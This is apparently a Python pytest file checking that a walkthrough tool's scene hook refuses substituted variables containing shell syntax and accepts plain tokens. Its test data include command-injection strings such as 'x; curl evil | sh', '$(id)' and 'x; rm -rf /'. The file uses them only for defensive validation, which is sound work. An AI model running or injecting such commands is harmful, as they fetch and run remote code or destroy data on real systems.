"""A captured `${var}` never smuggles shell syntax into a scene's `before:` hook."""
import pytest

from scripts.narrative.substitution import resolve_string
from scripts.walkthrough._lib import scene_hooks
from scripts.walkthrough._lib.scene_hooks import SceneHookError


def _run(command, variables):
    ran = []
    scene_hooks.run_scene_hook(
        {"command": command}, scene_index=2, variables=variables, resolve=resolve_string,
        runner=lambda cmd, **k: ran.append(cmd) or type("R", (), {"returncode": 0})())
    return ran


@pytest.mark.parametrize("value", ["opp-42", "a1b2c3", "https://x.test/p/42", "u@x.org", "1.5"])
def test_plain_tokens_are_substituted(value):
    assert _run("seed --id ${v}", {"v": value}) == [f"seed --id {value}"]


@pytest.mark.parametrize("value", ["x; curl evil | sh", "https://x.test/?a=1&b=2", "$(id)", "`id`", "a b", "x&&y", "'q'", "a\nb"])
def test_a_value_with_shell_syntax_fails_the_hook_instead_of_running(value):
    with pytest.raises(SceneHookError, match="only plain tokens"):
        _run("seed --id ${v}", {"v": value})


def test_unreferenced_unsafe_values_do_not_matter():
    assert _run("seed --all", {"v": "x; rm -rf /"}) == ["seed --all"]
